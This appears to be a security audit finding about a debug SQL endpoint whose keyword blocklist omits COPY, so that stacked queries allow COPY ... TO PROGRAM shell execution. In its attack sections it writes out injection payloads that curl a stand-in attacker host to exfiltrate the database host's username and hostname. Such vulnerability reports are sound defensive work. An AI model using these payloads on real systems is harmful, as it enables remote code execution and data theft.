---
id: longshot-16201ecf-002
phase: X2
anchor: apps/web/src/routes/api/debug/sql/+server.ts
slug: copy-to-program-missing-from-blocklist
severity: medium
confidence: medium
---

## Summary

The `DANGEROUS_KEYWORDS` blocklist in `validateSqlQuery` omits the `COPY` statement. Since `COPY` is not in the `ALLOWED_COMMANDS` set (which only allows `SELECT, EXPLAIN, SHOW, DESCRIBE, WITH`), a `COPY`-first query is rejected. However, when `COPY` appears as a second statement in a stacked query—e.g., `SELECT 1; COPY (SELECT 1) TO PROGRAM 'id'`—it passes both validation gates: the first token is `SELECT` (allowed), and `COPY` is not in `DANGEROUS_KEYWORDS` (no regex match). If the database user has superuser privileges, `COPY ... TO PROGRAM` executes an arbitrary shell command on the database host.

## Location

- `apps/web/src/lib/server/debug-helpers.ts:70-71` — `ALLOWED_COMMANDS` and `DANGEROUS_KEYWORDS` lists, both missing `COPY`
- `apps/web/src/routes/api/debug/sql/+server.ts:36` — raw query execution sink
- `apps/web/src/lib/debug-comprehensive.test.ts:181-186` — test only verifies `COPY` is rejected as a first token, not as a stacked statement

## Attacker Control

The attacker sends a POST request to `/api/debug/sql` with:

```json
{
  "sql": "SELECT 1; COPY (SELECT 'pwned') TO PROGRAM 'curl http://attacker.com/$(whoami)'"
}
```

- **Entry point**: `apps/web/src/routes/api/debug/sql/+server.ts:14-16`
- **Prerequisite**: Bearer token for `/api/debug/*` (validated in `apps/web/src/hooks.server.ts:7-12`)
- **Additional prerequisite**: Database user must have superuser privileges (pg 9.3+) or `pg_execute_server_program` role (pg 17+)

## Trust Boundary Crossed

The debug SQL endpoint is intended to be **read-only**. The `COPY ... TO PROGRAM` statement executes an arbitrary shell command on the database server's operating system. This crosses from a "read-only SQL query" boundary into **OS command execution**.

## Impact

If the database user has superuser (or equivalent) privileges:
- **Remote code execution** on the database host
- **Data exfiltration** via outbound network requests from the DB server
- **Lateral movement** within the infrastructure
- Full compromise of the database server

If the database user lacks these privileges, the attack fails with a PostgreSQL permission error, but the validation gap remains.

## Evidence

### 1. `COPY` is absent from `DANGEROUS_KEYWORDS` (debug-helpers.ts:71)

```typescript
// apps/web/src/lib/server/debug-helpers.ts:70-71
const ALLOWED_COMMANDS = new Set(['SELECT', 'EXPLAIN', 'SHOW', 'DESCRIBE', 'WITH']);
const DANGEROUS_KEYWORDS = ['INSERT', 'UPDATE', 'DELETE', 'DROP', 'ALTER', 'TRUNCATE', 'CREATE'];
```

Neither list contains `COPY`. Other PostgreSQL commands that can alter state or execute code are similarly absent: `PREPARE`, `EXECUTE`, `LISTEN`, `NOTIFY`, `VACUUM`, `REINDEX`, `GRANT`, `REVOKE`.

### 2. Test only covers COPY as a first token (debug-comprehensive.test.ts:181-186)

```typescript
// apps/web/src/lib/debug-comprehensive.test.ts:181-186
it('should reject COPY statement (caught by first-token check)', () => {
    const result = validateSqlQuery("COPY flights TO '/tmp/dump.csv'");
    expect(result.valid).toBe(false);
    if (!result.valid) expect(result.error).toContain('COPY');
});
```

This test never exercises `COPY` as a stacked second statement. A query like `SELECT 1; COPY (SELECT 1) TO PROGRAM 'id'` is not tested.

### 3. Stacked queries confirmed possible (drizzle-orm session.js:110-112)

```javascript
// node_modules/drizzle-orm/node-postgres/session.js:110-112
return this.queryWithCache(rawQuery.text, params, async () => {
    return await client.query(rawQuery, params);
});
```

`client.query()` is node-postgres `Pool.query()`, which sends the full query string to PostgreSQL. PostgreSQL natively supports multiple semicolon-separated statements.

### 4. Validation trace for the attack query

For `SELECT 1; COPY (SELECT 1) TO PROGRAM 'id'`:
- `query.split(/\s+/)[0]?.toUpperCase()` → `SELECT` → in `ALLOWED_COMMANDS` ✓
- `upperQuery` = `SELECT 1; COPY (SELECT 1) TO PROGRAM 'ID'`
- Check each dangerous keyword via `\bKEYWORD\b`: none of `INSERT`, `UPDATE`, `DELETE`, `DROP`, `ALTER`, `TRUNCATE`, `CREATE` appear ✓
- Returns `{ valid: true }`

## Exploit Sketch

1. Obtain `DEBUG_API_TOKEN`
2. Send POST to `/api/debug/sql` with `Authorization: Bearer <token>` header
3. Body: `{"sql": "SELECT 1; COPY (SELECT '') TO PROGRAM 'curl https://attacker.com/?d=$(hostname)'"}`
4. Validation passes (first token SELECT, no dangerous keywords)
5. PostgreSQL executes `COPY TO PROGRAM`, running the shell command
6. Attacker receives callback at their controlled server with the DB host's hostname

## Open Questions

- **Database user privilege level**: Is the application's database user a superuser or granted `pg_execute_server_program`? If not, this specific attack fails but the validation gap still exists for other missing keywords (`PREPARE`, `EXECUTE`, etc.).
- **PostgreSQL version**: `COPY TO PROGRAM` was introduced in PostgreSQL 9.3. In PostgreSQL 17+, the `pg_execute_server_program` predefined role can grant this capability without full superuser.
- **Network egress from DB host**: If the database host has restricted outbound network access, the callback-based exfiltration method would fail, but other `COPY TO PROGRAM` attacks (e.g., writing webshells to a web-accessible directory) could still succeed.
